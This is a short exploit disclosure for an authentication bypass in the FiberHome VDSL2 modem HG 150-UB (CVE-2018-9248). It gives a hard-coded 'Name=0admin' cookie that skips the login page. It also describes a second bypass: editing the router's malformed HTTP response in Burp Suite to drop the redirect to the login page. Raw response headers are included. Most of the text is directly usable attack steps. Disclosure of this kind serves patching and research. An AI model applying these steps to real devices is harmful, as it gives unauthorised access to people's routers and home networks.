# Exploit Title: FiberHome VDSL2 Modem HG 150-UB Authentication Bypass
# Date: 04/03/2018
# Exploit Author: Noman Riffat
# Vendor Homepage: http://www.fiberhome.com/
# CVE : CVE-2018-9248, CVE-2018-9248

The vulnerability exists in plain text & hard coded cookie. Using any
cookie manager extension, an attacker can bypass login page by setting the
following Master Cookie.

Cookie: Name=0admin

Then access the homepage which will no longer require authentication.
http://192.168.10.1/

Due to improper session implementation, there is another way to bypass
login. The response header of homepage without authentication looks like
this.

HTTP/1.1 200 Ok
Server: micro_httpd
Cache-Control: no-cache
Date: Tue, 03 Apr 2018 18:33:12 GMT
Set-Cookie: Name=; path=/
Content-Type: text/html
Connection: close

<html><head><script language='javascript'>
parent.location='login.html'
</script></head><body></body></html>HTTP/1.1 200 Ok
Server: micro_httpd
Cache-Control: no-cache
Date: Tue, 03 Apr 2018 18:33:12 GMT
Content-Type: text/html
Connection: close

<html>
<head>
.. continue to actual homepage source

The response header looks totally messed up and by triggering burp suite
and modifying it to following will grant access to homepage without
authentication.

HTTP/1.1 200 Ok
Server: micro_httpd
Cache-Control: no-cache
Date: Tue, 03 Apr 2018 18:33:12 GMT
Set-Cookie: Name=; path=/
Content-Type: text/html
Connection: close

<html>
<head>
.. continue to actual homepage source